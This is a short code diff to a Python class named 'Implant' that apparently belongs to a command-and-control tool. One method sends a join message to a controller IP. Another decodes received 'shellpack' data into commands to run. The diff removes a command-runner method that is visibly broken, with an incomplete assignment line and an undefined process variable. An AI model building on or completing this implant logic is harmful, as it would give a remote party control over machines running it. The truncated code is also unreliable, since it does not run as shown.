@@ -18,18 +18,7 @@ class Implant(Host):
 
     def join(self, shellpack):
         self.send(shellpack['ip'], "join")
-
-    def run(self, cmd, timeout_sec):
         
-        timer = Timer(timeout_sec, proc.kill)
-        try:
-            timer.start()
-            stdout, _ = 
-        finally:
-            timer.cancel()
-
-        return stdout
-
     def instruction(self, shellpack):
         try:
             cmd = shellpack['data'].decode()
